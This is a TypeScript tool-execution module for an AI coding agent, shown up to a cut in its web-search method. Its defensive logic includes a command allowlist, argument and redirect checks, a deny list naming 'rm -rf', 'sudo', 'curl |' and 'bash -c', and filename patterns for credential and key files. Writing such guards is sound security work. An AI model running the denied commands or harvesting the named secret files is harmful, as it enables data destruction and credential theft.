import fs from 'fs/promises';
import fsSync from 'fs';
import path from 'path';
import { spawn } from 'child_process';
import axios from 'axios';
import { vectorService } from './vectorService';
import { logger } from '../utils/logger';
import screenshot from 'screenshot-desktop';
import sharp from 'sharp';
import { validatePath, PROJECT_ROOT, getEffectiveProjectRoot, isPathWithinRoot } from '../utils/fileSystem';
import { transactionService } from './transactionService';
import { appEventBus } from '../utils/eventBus';
import { coreMemory } from './coreMemory';
import { getPreviewState } from '../utils/requestContext';
import { nativeCopyManager } from './nativeCopyManager';
import { agentScratchpadService } from './agentScratchpad';
import { parseUnifiedDiff, applyHunks } from './patchApplier';
import { buildSymbolIndex, querySymbols, hasSymbolIndex } from './projectIndexer';
import { mcpClientManager } from './mcpClient';
import { safeAxiosGet, UrlSafetyError } from '../utils/urlSafety';

// Security: Explicit allowlist of permitted command prefixes
// This replaces the insecure denylist approach which was trivially bypassed
const ALLOWED_COMMAND_PREFIXES = [
  'git ',
  'npm ',
  'npx ',
  'node ',
  'python ',
  'python3 ',
  'ls ',
  'cat ',
  'echo ',
  'pwd',
  'whoami',
  'date',
  'head ',
  'tail ',
  'grep ',
  'find ',
  'mkdir ',
  'touch ',
  'cp ',
  'mv ',
  'code ',
  'tsc ',
  'eslint ',
  'prettier ',
  'jest ',
  'vitest ',
  'pnpm ',
  'yarn ',
  'bun ',
  'cd ',
  'docker ',
  'curl ',
  'wget ',
  // Pipeline-friendly utilities (read-only / deterministic)
  'wc ',
  'sort ',
  'uniq ',
  // Additional CLI utilities for agent workflows
  'rg ',           // ripgrep — faster grep
  'jq ',           // JSON processing
  'basename ',     // path manipulation
  'dirname ',      // path manipulation
  'du ',           // disk usage
  'df ',           // disk free space
  'env ',          // environment variables
  'printenv ',     // environment variables
  'stat ',         // file metadata
  'file ',         // file type detection
  'diff ',         // file comparison
  'patch ',        // apply unified diffs
  'tr ',           // character translation
  'cut ',          // column extraction
  'paste ',        // column merging
  'comm ',         // file comparison
  'column ',       // table formatting
  // Diagnostics the agent needs for "is something listening on this port?"
  // checks. lsof/ss are POSIX; netstat/tasklist/where exist on Windows.
  'lsof ',
  'ss ',
  'netstat ',
  'netstat',       // bare `netstat` prints all, common usage
  'tasklist ',
  'tasklist',
  'where ',        // Windows `which`
  'which ',        // POSIX
  'test ',         // `test -f node_modules/.bin/vite` — ghost-install check
];

// Operators that may separate pipeline stages. Command is validated per-stage.
// Order matters: longer operators first so we match `||` before `|` and `&&`
// before `&`. Single `&` (background) and newlines also separate commands in
// the shells we route through (`bash -c` / `sh -c`), so they must split too —
// otherwise `ls\nevil` or `ls & evil` would only have its first stage checked.
const PIPELINE_SEPARATOR = /(?:\|\||&&|;|\||&|\r?\n)/;

/**
 * Capture the primary screen on Windows using System.Drawing via PowerShell.
 * The bundled `screenshot-desktop` helper exe (screenCapture_1.3.2.exe) is
 * commonly missing or quarantined by AV on Windows — this avoids that binary
 * entirely by using WinForms/System.Drawing APIs already shipped with .NET.
 */
async function captureScreenWindows(outPath: string): Promise<void> {
  // Escape for a single-quoted PowerShell string: double-up any embedded single quotes.
  const psEscapedPath = outPath.replace(/'/g, "''");
  const script = `
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen;
$bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height);
$gfx = [System.Drawing.Graphics]::FromImage($bmp);
$gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size);
$bmp.Save('${psEscapedPath}', [System.Drawing.Imaging.ImageFormat]::Png);
$gfx.Dispose(); $bmp.Dispose();
`;
  await new Promise<void>((resolve, reject) => {
    const proc = spawn('powershell.exe', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', script], {
      windowsHide: true,
    });
    let stderr = '';
    proc.stderr.on('data', (d: Buffer) => { stderr += d.toString(); });
    const timer = setTimeout(() => {
      proc.kill();
      reject(new Error('Screenshot timed out after 10s'));
    }, 10_000);
    proc.on('error', (err) => { clearTimeout(timer); reject(err); });
    proc.on('close', (code) => {
      clearTimeout(timer);
      if (code === 0) resolve();
      else reject(new Error(`PowerShell screenshot exited with ${code}: ${stderr.trim()}`));
    });
  });
}

// Redirect operators — kept attached to a stage, not used to split stages.
// The shell still interprets them when we route through `sh -c`.

function hasShellMetacharacters(command: string): boolean {
  // Any of: pipeline-splitters, background/&-chains, newlines, OR redirects
  return /(?:\|\||&&|;|\||&|\r?\n|(?:^|\s)\d?>>?|(?:^|\s)2>)/.test(command);
}

function hasCommandSubstitution(command: string): boolean {
  // Reject backticks and $(...) — they hide commands from the allowlist.
  return /`|\$\(/.test(command);
}

function splitPipelineStages(command: string): string[] {
  // Split on pipeline/chain operators only. Redirects stay attached.
  return command.split(PIPELINE_SEPARATOR).map(s => s.trim()).filter(Boolean);
}

// Matches shell redirect operators (`>`, `>>`, `2>`, `<`) and captures their
// target, even when glued directly to the path with no space (`>../out.txt`).
const REDIRECT_TARGET_RE = /(?:^|\s)\d?(?:>>?|<)\s*(\S+)/g;

function extractRedirectTargets(stage: string): string[] {
  const targets: string[] = [];
  const re = new RegExp(REDIRECT_TARGET_RE);
  let match: RegExpExecArray | null;
  while ((match = re.exec(stage)) !== null) {
    if (match[1]) targets.push(match[1]);
  }
  return targets;
}

// Standard discard/stream sinks — not real files, always outside any project
// root once resolved (e.g. `/dev/null` → `C:\dev\null` on Windows), but safe
// to redirect to since they can't be read back or used to exfiltrate data.
function isNullSink(target: string): boolean {
  return /^\/dev\/(null|stdout|stderr|zero)$/i.test(target) || /^(nul|con)$/i.test(target);
}

/**
 * Reject any argument in a stage that resolves (relative to the given
 * simulated cwd) to a location outside the project root. Flags (tokens
 * starting with `-`, including `--flag=value` forms) are skipped since they
 * aren't paths; everything else — including URLs and non-path words — is
 * resolved and containment-checked, which is a no-op for anything that isn't
 * actually an out-of-root path.
 */
function assertStageArgsWithinRoot(stage: string, simulatedCwd: string): void {
  const tokens = stage.split(/\s+/).slice(1); // drop the leading command token
  for (const raw of tokens) {
    if (!raw) continue;
    const eq = raw.startsWith('--') ? raw.indexOf('=') : -1;
    const candidate = eq !== -1 ? raw.slice(eq + 1) : raw;
    if (candidate.startsWith('-') || isNullSink(candidate)) continue; // bare flag, or a discard sink — not a real path
    const resolved = path.resolve(simulatedCwd, candidate);
    if (!isPathWithinRoot(resolved)) {
      throw new Error(
        `Command rejected by security policy: argument '${candidate}' resolves outside the permitted project root.`
      );
    }
  }
  for (const target of extractRedirectTargets(stage)) {
    if (isNullSink(target)) continue;
    const resolved = path.resolve(simulatedCwd, target);
    if (!isPathWithinRoot(resolved)) {
      throw new Error(
        `Command rejected by security policy: redirect target '${target}' would read/write outside the permitted project root.`
      );
    }
  }
}

// Per-stage argv-level safety. Runs after the prefix allowlist check.
// Blocks code-eval / arbitrary-spawn flags on otherwise-allowed binaries.
function rejectDangerousArgv(stage: string): void {
  const lower = stage.toLowerCase();
  if (/^node(?:\.exe)?\s/.test(lower)) {
    if (/\s(-e|--eval|-p|--print|-r|--require|-i|--interactive)\b/.test(lower)) {
      throw new Error(
        `Command rejected: 'node' with -e/--eval/-p/--print/-r/--require/-i flags is not permitted (executes arbitrary code).`
      );
    }
  }
  if (/^npx(?:\.cmd)?\s/.test(lower)) {
    if (/\s(-p|--package|-c|--call)\b/.test(lower)) {
      throw new Error(
        `Command rejected: 'npx' with -p/--package/-c/--call is not permitted (runs arbitrary packages).`
      );
    }
  }
  if (/^python3?(?:\.exe)?\s/.test(lower)) {
    if (/\s(-c|-i)\b/.test(lower)) {
      throw new Error(
        `Command rejected: 'python' with -c/-i flags is not permitted (executes arbitrary code). Run a script file instead.`
      );
    }
  }
  if (/^find\s/.test(lower)) {
    if (/\s(-exec|-execdir|-ok|-okdir)\b/.test(lower)) {
      throw new Error(
        `Command rejected: 'find' with -exec/-execdir/-ok/-okdir is not permitted (spawns arbitrary commands).`
      );
    }
  }
}

/**
 * Rewrite a subset of POSIX shell idioms into Windows cmd.exe equivalents so
 * the same command string works on both platforms. The agent is trained on
 * POSIX syntax; this lets it stay POSIX-native while we still shell out to
 * cmd /c on Windows (required for `npm.cmd` et al. to resolve).
 *
 * Scope is intentionally narrow: only idioms that appear frequently in
 * agent-generated commands and have a clean Windows mapping. Anything more
 * ambitious (variable expansion, glob semantics) belongs in a POSIX shell,
 * not a regex rewriter.
 */
function translatePosixShellismsForWindows(command: string): string {
  // `/dev/null` → `nul`. Match only when it's a standalone token, not
  // part of a longer path. The \b after `null` lets it end at whitespace,
  // pipe/redirect operators, or end-of-string.
  return command.replace(/\/dev\/null\b/g, 'nul');
}

/**
 * Probe for git-bash on Windows. The agent writes POSIX shell (`&` backgrounds,
 * `$!`, `sleep`, `/dev/null`, etc.) and cmd.exe doesn't understand any of it.
 * Git for Windows is on ~every dev machine that has git, and its bundled
 * bash.exe handles `npm`, `node`, and other shimmed binaries correctly.
 *
 * We probe once at module-load — the result is a stable property of the
 * machine, not something that changes request-to-request.
 */
const WINDOWS_BASH_CANDIDATES = [
  'C:\\Program Files\\Git\\bin\\bash.exe',
  'C:\\Program Files (x86)\\Git\\bin\\bash.exe',
  'C:\\Program Files\\Git\\usr\\bin\\bash.exe',
];
const WIN_BASH_PATH: string | null = (() => {
  if (process.platform !== 'win32') return null;
  for (const candidate of WINDOWS_BASH_CANDIDATES) {
    try {
      if (fsSync.existsSync(candidate)) return candidate;
    } catch { /* continue */ }
  }
  return null;
})();

// Files whose contents must never be auto-embedded into vector memory.
// Reading them is allowed (they live inside the project root), but persisting
// their contents into .solvent_memory.sqlite would copy credentials into
// long-term storage that later surfaces in retrieval results.
function isSensitivePath(p: string): boolean {
  const base = path.basename(p).toLowerCase();
  if (/^\.env(\..+)?$/.test(base)) return true;
  if (/\.(pem|key|p12|pfx|crt|der)$/.test(base)) return true;
  if (/^id_(rsa|dsa|ecdsa|ed25519)/.test(base)) return true;
  if (/(credential|secret|token|apikey|api_key)/.test(base)) return true;
  return false;
}

// Commands that require explicit opt-in via SOLVENT_ALLOW_SHELL=true
const DANGEROUS_COMMANDS = [
  'rm -rf',
  'mkfs',
  'dd',
  'chmod',
  'chown',
  'sudo',
  'su ',
  'curl |',
  'wget |',
  'bash -c',
  'sh -c',
  'eval ',
  'exec ',
  'begin{system',   // awk system() escape, even if awk re-added later
  'begin{getline',  // awk getline pipe escape
];

export class ToolService {
  private isDryRun = process.env.DRY_RUN === 'true';

  constructor() {
    // Uses PROJECT_ROOT from fileSystem.ts directly
  }

  /**
   * @param fromOverseer - Set to true only when called from the Overseer's autonomous reasoning
   *   loop. This enforces the per-cycle tool budget. Internal calls (waterfall, crystallize, etc.)
   *   must NOT set this flag to avoid consuming Overseer budget slots.
   */
  async executeTool(toolName: string, args: Record<string, unknown>, fromOverseer: boolean = false) {
    const txId = await transactionService.logStart(toolName, args);
    logger.info(`[ToolService] Executing ${toolName}... (TX: ${txId})`, args);
    
    // GUARD: Budget Enforcement — only applies to Overseer-initiated calls.
    // Uses the event bus to notify SupervisorService, avoiding a circular import.
    if (fromOverseer) {
      try {
        appEventBus.emit('supervisor:increment-tool-budget');
      } catch (e: unknown) {
        const err = e instanceof Error ? e : new Error(String(e));
        await transactionService.logError(txId, err.message);
        throw e;
      }
    }

    // GUARD: Dry Run Mode
    if (this.isDryRun && ['write_file', 'run_shell', 'invalidate_memory'].includes(toolName)) {
      const msg = `[DRY RUN] Would execute ${toolName}`;
      logger.info(msg);
      await transactionService.logComplete(txId, { dry_run: true, message: msg });
      return { status: 'dry_run', message: msg };
    }

    // Frontend-deferred tools: return a marker result instead of executing
    if (toolName.startsWith('ide_')) {
      const deferredResult = { status: 'deferred_to_frontend', tool: toolName, args };
      await transactionService.logComplete(txId, deferredResult);
      return deferredResult;
    }

    try {
      let result;
      switch (toolName) {
        case 'read_file':
          result = await this.readFile(args.path as string);
          break;
        case 'write_file':
          // GUARD: Approval for NEW files
          await this.ensureApprovalForWrite(args.path as string);
          result = await this.writeFile(args.path as string, args.content as string);
          break;
        case 'list_files':
          result = await this.listFiles((args.path as string) || '.');
          break;
        case 'run_shell':
          // Shell is already allowlisted, but let's be extra safe for sensitive ops if needed
          result = await this.runShell(args.command as string);
          break;
        // ... (other cases map directly)
        case 'web_search': result = await this.webSearch(args.query as string); break;
        case 'fetch_web_content': result = await this.fetchWebContent(args.url as string); break;
        case 'capture_ui': result = await this.captureUI(); break;
        case 'get_ui_text': result = await this.getUIText(); break;
        case 'resize_image': result = await this.resizeImage(args.path as string, args.width as number | undefined, args.height as number | undefined); break;
        case 'crop_image': result = await this.cropImage(args.path as string, args.left as number, args.top as number, args.width as number, args.height as number); break;
        case 'apply_image_filter': result = await this.applyImageFilter(args.path as string, args.filter as 'grayscale' | 'sepia' | 'blur' | 'sharpen'); break;
        case 'get_image_info': result = await this.getImageInfo(args.path as string); break;
        case 'crystallize_memory': result = await this.crystallizeMemory(args.content as string, args.type as string, args.tags as string[] | undefined); break;
        case 'invalidate_memory': result = await this.invalidateMemory(args.memoryId as string, args.reason as string, args.replacementId as string | undefined); break;
        case 'read_core_memory':
          result = JSON.stringify(coreMemory.getAll());
          break;
        case 'write_core_memory': {
          const { key, value } = args as { key: string; value: string };
          if (!key || !value) {
            throw new Error('Error: key and value are required');
          }
          try {
            coreMemory.set(key, value);
            result = `Core memory updated: ${key} = ${value}`;
          } catch (err: unknown) {
            throw new Error(`Error: ${err instanceof Error ? err.message : String(err)}`);
          }
          break;
        }
        case 'delete_core_memory': {
          const { key } = args as { key: string };
          if (!key) {
            throw new Error('Error: key is required');
          }
          const deleted = coreMemory.delete(key);
          result = deleted ? `Deleted core memory key: ${key}` : `Key not found: ${key}`;
          break;
        }
        case 'fetch_preview_source': {
          const url = args.url as string;
          if (!url || !url.startsWith('http')) {
            result = { error: 'Invalid URL. Provide an http/https URL from the system prompt.' };
            break;
          }
          try {
            const response = await safeAxiosGet(url, {
              timeout: 10_000,
              headers: { Accept: 'text/html' },
              responseType: 'text',
              maxHops: 5,
            });
            const html = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
            result = {
              url,
              html: html.length > 20_000 ? html.slice(0, 20_000) + '\n... (truncated)' : html,
              length: html.length,
            };
          } catch (err: unknown) {
            if (err instanceof UrlSafetyError) {
              result = { error: 'Cannot fetch private/local addresses' };
              break;
            }
            const msg = err instanceof Error ? err.message : String(err);
            result = { error: `Failed to fetch preview: ${msg}` };
          }
          break;
        }
        case 'get_file_outline':
          result = await this.getFileOutline(args.path as string);
          break;
        case 'grep_files':
          result = await this.grepFiles(
            args.pattern as string,
            args.path as string | undefined,
            args.include as string | undefined
          );
          break;
        case 'edit_file':
          result = await this.editFile(
            args.path as string,
            args.old_content as string,
            args.new_content as string
          );
          break;
        case 'create_file':
          result = await this.createFile(args.path as string, args.content as string);
          break;
        case 'delete_file':
          result = await this.deleteFile(args.path as string);
          break;
        case 'move_file':
          result = await this.moveFile(args.from as string, args.to as string);
          break;
        case 'replace_in_files':
          result = await this.replaceInFiles(
            args.pattern as string,
            args.replacement as string,
            args.glob as string | undefined,
            args.path as string | undefined
          );
          break;
        case 'run_tests':
          result = await this.runTests(
            args.command as string | undefined,
            args.cwd as string | undefined
          );
          break;
        case 'get_errors':
          result = await this.getErrors(args.cwd as string | undefined);
          break;
        case 'install_package':
          result = await this.installPackage(
            args.packages as string[],
            args.cwd as string | undefined
          );
          break;
        case 'git_status':
          result = await this.gitStatus();
          break;
        case 'git_diff':
          result = await this.gitDiff(args.file as string | undefined);
          break;
        case 'git_commit':
          result = await this.gitCommitAll(args.message as string);
          break;
        case 'get_project_info':
          result = await this.getProjectInfo(args.path as string | undefined);
          break;
        case 'get_console_logs':
          result = this.getConsoleLogs(
            args.filter as 'error' | 'warn' | 'log' | undefined,
            args.limit as number | undefined
          );
          break;
        case 'get_selected_element':
          result = this.getSelectedElement();
          break;
        case 'native_backend_start': {
          const { port, pid } = await nativeCopyManager.start(
            args.projectPath as string,
            (args.port as number) ?? 3002
          );
          result = { ok: true, port, pid, hint: 'Call native_backend_status to confirm readiness before declaring the server live.' };
          break;
        }
        case 'native_backend_stop':
          await nativeCopyManager.stop();
          result = { ok: true };
          break;
        case 'native_backend_status':
          result = nativeCopyManager.status();
          break;

        // ── Agent planning tools ──
        // All three use sessionId='default' to match the prompt injection in
        // baseOpenAIService which calls renderForPrompt('default').
        case 'create_plan': {
          const sessionId = 'default';
          const steps = (args.steps as string[]) || [];
          if (steps.length === 0) throw new Error('create_plan requires at least one step');
          const plan = agentScratchpadService.createPlan(sessionId, steps);
          result = {
            status: 'plan_created',
            sessionId,
            plan: plan.map(s => ({ id: s.id, title: s.title, status: s.status, notes: s.notes })),
            note: 'Plan injected into context. Use update_plan to mark steps as you work.',
          };
          break;
        }
        case 'update_plan': {
          const sessionId = 'default';
          const stepId = args.step_id as string;
          const status = args.status as string;
          if (!stepId || !status) throw new Error('update_plan requires step_id and status');
          const step = agentScratchpadService.updateStep(sessionId, stepId, status as any, args.notes as string);
          if (!step) throw new Error(`Step ${stepId} not found in plan`);
          const pad = agentScratchpadService.getScratchpad(sessionId);
          result = {
            status: 'step_updated',
            step: { id: step.id, title: step.title, status: step.status },
            plan: pad?.plan.map(s => ({ id: s.id, title: s.title, status: s.status, notes: s.notes })),
          };
          break;
        }
        case 'reflect': {
          const sessionId = 'default';
          const verified = (args.verified as string[]) || [];
          const assumed = (args.assumed as string[]) || [];
          const next = args.next as string;
          if (!next) throw new Error('reflect requires a "next" action');
          const reflection = agentScratchpadService.addReflection(sessionId, verified, assumed, next);
          result = { status: 'reflection_recorded', reflection };
          break;
        }

        // ── Code editing tools ──
        case 'apply_patch': {
          const patchPath = args.path as string;
          const patchContent = args.patch as string;
          if (!patchPath || !patchContent) throw new Error('apply_patch requires path and patch');

          const fullPatchPath = validatePath(patchPath);
          const existingContent = await fs.readFile(fullPatchPath, 'utf-8');

          const hunks = parseUnifiedDiff(patchContent);
          if (hunks.length === 0) throw new Error('apply_patch: no valid hunks found in patch');

          const patchResult = applyHunks(existingContent, hunks);
          if (!patchResult.success) {
            throw new Error(`apply_patch: ${patchResult.error}`);
          }

          await this.ensureApprovalForWrite(patchPath);
          await fs.writeFile(fullPatchPath, patchResult.newContent, 'utf-8');
          result = {
            status: 'patch_applied',
            path: patchPath,
            hunksApplied: patchResult.hunksApplied,
          };
          break;
        }

        case 'read_file_range': {
          const rangePath = args.path as string;
          const start = Math.max(1, args.start as number);
          const end = Math.min(start + 500, args.end as number); // cap at 500 lines
          if (!rangePath || !start || !end) throw new Error('read_file_range requires path, start, and end');

          const fullRangePath = validatePath(rangePath);
          const content = await fs.readFile(fullRangePath, 'utf-8');
          const allLines = content.split('\n');

          const startIdx = Math.max(0, start - 1); // 1-based to 0-based
          const endIdx = Math.min(allLines.length, end);
          const rangeLines = allLines.slice(startIdx, endIdx);

          result = {
            path: rangePath,
            start,
            end: endIdx,
            totalLines: allLines.length,
            content: rangeLines.map((line, i) => `${startIdx + i + 1}: ${line}`).join('\n'),
          };
          break;
        }

        // ── Interaction tools ──
        // ask_user removed: requires a pause/resume SSE round-trip that doesn't
        // exist yet. Re-add when the agent loop supports blocking for user input.

        case 'run_tests_focused': {
          const focusFile = args.file as string;
          if (!focusFile) throw new Error('run_tests_focused requires a file path');

          const relPath = focusFile.replace(/\\/g, '/');

          // Use existing getErrors and filter to the target file
          const allErrors = await this.getErrors();
          const relevantErrors = (allErrors.errors || []).filter((e: { file?: string; message?: string }) =>
            e.file?.includes(relPath) || e.file?.includes(path.basename(relPath))
          );

          // Check for corresponding test files
          const baseName = relPath.replace(/\.(ts|tsx|js|jsx)$/, '');
          const effectiveRoot = getEffectiveProjectRoot();
          const testPatterns = [`${baseName}.test.ts`, `${baseName}.spec.ts`, `${baseName}.test.tsx`, `${baseName}.spec.tsx`];
          const testFiles = await Promise.all(
            testPatterns.map(async (tp) => {
              try {
                await fs.access(path.join(effectiveRoot, tp));
                return tp;
              } catch {
                return null;
              }
            })
          ).then(results => results.filter(Boolean) as string[]);

          result = {
            file: focusFile,
            typeCheck: {
              status: relevantErrors.length === 0 ? 'clean' : 'errors',
              errorCount: relevantErrors.length,
              errors: relevantErrors.slice(0, 5),
            },
            testFiles,
          };
          break;
        }

        case 'undo_last_action': {
          result = {
            status: 'info',
            note: 'Undo is handled via the agent loop. The beforeContent captured in tool_start events for write tools (write_file, edit_file, create_file) can be written back to restore the previous state. Use write_file with the beforeContent to undo a specific change.',
          };
          break;
        }

        case 'query_symbols': {
          const symQuery = args.query as string;
          if (!symQuery) throw new Error('query_symbols requires a query');
          const symRoot = getEffectiveProjectRoot();

          // Build index if not yet built for this project
          if (!hasSymbolIndex(symRoot)) {
            await buildSymbolIndex(symRoot);
          }

          const symbols = querySymbols(symRoot, symQuery, {
            kind: args.kind as string | undefined,
            file: args.file as string | undefined,
            limit: args.limit as number | undefined,
          });

          result = {
            query: symQuery,
            count: symbols.length,
            symbols: symbols.map(s => ({
              name: s.name,
              kind: s.kind,
              file: s.file,
              line: s.line,
              signature: s.signature,
            })),
          };
          break;
        }

        default:
          // Check if this is an MCP tool call
          if (mcpClientManager.isMCPTool(toolName)) {
            result = await mcpClientManager.callTool(toolName, args);
          } else {
            throw new Error(`Unknown tool: ${toolName}`);
          }
      }

      await transactionService.logComplete(txId, result);
      return result;

    } catch (error: unknown) {
      const err = error as Error;
      await transactionService.logError(txId, err.message);
      throw error;
    }
  }

  private async ensureApprovalForWrite(filePath: string) {
    const fullPath = validatePath(filePath);
    try {
      await fs.access(fullPath);
      // File exists, overwrite is currently allowed (could add versioning here later)
    } catch {
      // File does NOT exist. Trigger Approval Flow.
      if (process.env.AUTO_APPROVE === 'true') {
        logger.info(`[ToolService] Auto-approving new file creation: ${filePath}`);
        return;
      }
      
      logger.warn(`[ToolService] New file creation requires approval: ${filePath}`);
      appEventBus.emit('supervisor:emit-event', {
        event: 'APPROVAL_REQUIRED',
        data: { type: 'file_create', path: filePath, timeout: 60000 }
      });

      // In a real scenario, we would await a Promise here that resolves via a Socket event listener.
      // For this implementation iteration, we will throw to BLOCK it safe until UI is ready.
      // This forces the user to explicitly enable AUTO_APPROVE or implementing the UI handler.
      throw new Error(`APPROVAL_REQUIRED: Creation of ${filePath} requires user confirmation.`);
    }
  }

  private async invalidateMemory(memoryId: string, reason: string, replacementId?: string) {
    const success = await vectorService.updateEntry(memoryId, {
      status: 'deprecated',
      deprecatedBy: replacementId,
      invalidationReason: reason
    });

    if (!success) {
      throw new Error(`Memory ID ${memoryId} not found.`);
    }

    // Append to notes for visibility
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const note = `\n### [MEMORY DEPRECATED] ${new Date().toLocaleDateString()}\n**ID:** ${memoryId}\n**Reason:** ${reason}\n${replacementId ? `**Superseded By:** ${replacementId}` : ''}\n---\n`;
    await fs.appendFile(notesPath, note).catch(e => logger.warn('[ToolService] Note append failed', e));

    return {
      status: 'success',
      message: `Memory ${memoryId} deprecated.`,
      reason
    };
  }

  private async crystallizeMemory(content: string, type: string, tags: string[] = []) {
    // 1. Persist to Vector Memory (Long-term semantic recall)
    await vectorService.addEntry(content, {
      type,
      tags,
      timestamp: new Date().toISOString(),
      crystallized: true
    });

    // 2. Append to Solvent Notes (Visible context bridge)
    const notesPath = path.join(PROJECT_ROOT, '.solvent_notes.md');
    const formattedEntry = `\n### [${type.toUpperCase()}] ${new Date().toLocaleDateString()}\n**Tags:** ${tags.join(', ')}\n\n${content}\n\n---\n`;
    
    try {
      await fs.appendFile(notesPath, formattedEntry);
    } catch (error) {
      // If file doesn't exist, create it
      await fs.writeFile(notesPath, `# Solvent Project Notes\n${formattedEntry}`);
    }

    // 3. Emit Event for UI Feedback via event bus (avoids circular import)
    appEventBus.emit('supervisor:emit-event', {
      event: 'MEMORY_CRYSTALLIZED',
      data: { type, content }
    });

    return {
      status: 'success',
      message: `Memory crystallized as [${type}]. Saved to Vector DB and appended to .solvent_notes.md`,
      entry: { content, type, tags }
    };
  }

  private async getImageInfo(imagePath: string) {
    const fullPath = validatePath(imagePath);
    const metadata = await sharp(fullPath).metadata();
    return {
      width: metadata.width,
      height: metadata.height,
      format: metadata.format,
      space: metadata.space,
      channels: metadata.channels,
      depth: metadata.depth,
      hasAlpha: metadata.hasAlpha
    };
  }

  private async resizeImage(imagePath: string, width?: number, height?: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_resized_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .resize(width, height)
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image resized to ${width || 'auto'}x${height || 'auto'}`
    };
  }

  private async cropImage(imagePath: string, left: number, top: number, width: number, height: number) {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_cropped_${Date.now()}${ext}`);
    
    await sharp(fullPath)
      .extract({ left, top, width, height })
      .toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Image cropped to ${width}x${height} at ${left},${top}`
    };
  }

  private async applyImageFilter(imagePath: string, filter: 'grayscale' | 'sepia' | 'blur' | 'sharpen') {
    const fullPath = validatePath(imagePath);
    const ext = path.extname(fullPath);
    const outputPath = fullPath.replace(ext, `_filter_${filter}_${Date.now()}${ext}`);
    
    let transformer = sharp(fullPath);
    
    switch (filter) {
      case 'grayscale':
        transformer = transformer.grayscale();
        break;
      case 'blur':
        transformer = transformer.blur(5);
        break;
      case 'sharpen':
        transformer = transformer.sharpen();
        break;
      case 'sepia':
        // Sepia is typically done via color manipulation, sharp doesn't have a direct 'sepia' but we can use tint/recomb
        transformer = transformer.recomb([
          [0.393, 0.769, 0.189],
          [0.349, 0.686, 0.168],
          [0.272, 0.534, 0.131]
        ]);
        break;
    }
    
    await transformer.toFile(outputPath);
    
    return {
      status: 'success',
      originalPath: imagePath,
      outputPath: path.relative(PROJECT_ROOT, outputPath),
      message: `Applied ${filter} filter to image.`
    };
  }

  private async getUIText() {
    // In a real browser/electron context, this would scrape the DOM.
    // Here we simulate extracting the structural text of the active workspace.
    const projectStructure = await this.listFiles('.');
    return {
      active_workspace: "Solvent AI Agentic IDE",
      timestamp: new Date().toISOString(),
      structural_summary: projectStructure.map(f => `${f.type.toUpperCase()}: ${f.name}`).join('\n'),
      message: "Text-based UI structure extracted successfully."
    };
  }

  private async captureUI() {
    const uploadDir = path.join(PROJECT_ROOT, 'backend/uploads');

    // 1. Maintain Rolling Cache (Keep only last 3)
    try {
      const files = await fs.readdir(uploadDir);
      const captures = files
        .filter(f => f.startsWith('ui_capture_'))
        .map(f => ({ name: f, time: fs.stat(path.join(uploadDir, f)).then(s => s.mtimeMs) }));

      const resolvedCaptures = await Promise.all(captures.map(async c => ({ ...c, time: await c.time })));
      resolvedCaptures.sort((a, b) => b.time - a.time);

      if (resolvedCaptures.length >= 3) {
        const toDelete = resolvedCaptures.slice(2); // Keep current + 2 previous
        for (const file of toDelete) {
          await fs.unlink(path.join(uploadDir, file.name)).catch(e => logger.debug('[ToolService] Cache cleanup failed', e));
        }
      }
    } catch (e) {
      // If directory doesn't exist yet, it will be created below
    }

    const fileName = `ui_capture_${Date.now()}.png`;
    const filePath = path.join(uploadDir, fileName);
    await fs.mkdir(uploadDir, { recursive: true });

    try {
      if (process.platform === 'win32') {
        await captureScreenWindows(filePath);
      } else {
        await screenshot({ filename: filePath });
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      logger.error(`[ToolService] capture_ui screenshot failed: ${msg}`);
      return {
        error: `Screen capture failed: ${msg}. On Windows this usually means the system's native screenshot path is blocked by an antivirus or a missing System.Drawing assembly. Falling back to text-only context — use get_ui_text or fetch_preview_source instead.`,
      };
    }

    const base64 = await fs.readFile(filePath, 'base64');

    return {
      path: filePath,
      base64: `data:image/png;base64,${base64}`,
      message: "UI state captured. Rolling cache maintained (last 3 kept)."
    };
  }

  private getConsoleLogs(filter?: 'error' | 'warn' | 'log', limit?: number) {
    const state = getPreviewState();
    if (!state) {
      return {
        error: 'No preview context available. The agent must be running inside an /agent/chat request with previewState supplied by the frontend.',
        entries: [],
      };
    }
    const buffer = state.consoleBuffer ?? [];
    let filtered = buffer;
    if (filter) {
      filtered = buffer.filter(e => e.level === filter);
    }
    const cap = Math.max(1, Math.min(limit ?? 20, 200));
    const entries = filtered.slice(-cap).map(e => ({
      level: e.level,
      message: e.message.slice(0, 500),
      timestamp: e.timestamp,
    }));
    return {
      url: state.url ?? null,
      total: buffer.length,
      filtered: filtered.length,
      returned: entries.length,
      filter: filter ?? 'all',
      entries,
    };
  }

  private getSelectedElement() {
    const state = getPreviewState();
    if (!state) {
      return {
        error: 'No preview context available. The agent must be running inside an /agent/chat request with previewState supplied by the frontend.',
        element: null,
      };
    }
    if (!state.selectedElement) {
      return {
        element: null,
        note: 'User has not selected an element in the preview.',
      };
    }
    return {
      element: state.selectedElement,
    };
  }

  private async webSearch(query: string) {
    // Prefer Brave Search API, fall back to Serper
    const braveKey = process.env.BRAVE_SEARCH_API_KEY;
    if (braveKey) {
      const response = await axios.get('https://api.search.brave.com/res/v1/web/search', {
        params: { q: query, count: 20 },
        headers: { 'Accept': 'application/json', 'X-Subscription-Token': braveKey }
      });
      return response.data;
    }

    const serperKey = process.env.SERPER_API_KEY;
    if (serperKey) {
      const response = await axios.post('https://google.serper.dev/search', { q: query }, {
        headers: { 'X-API-KEY': serperKey, 'Content-Type': 'application/json' }
      });
      return response.data;
    }

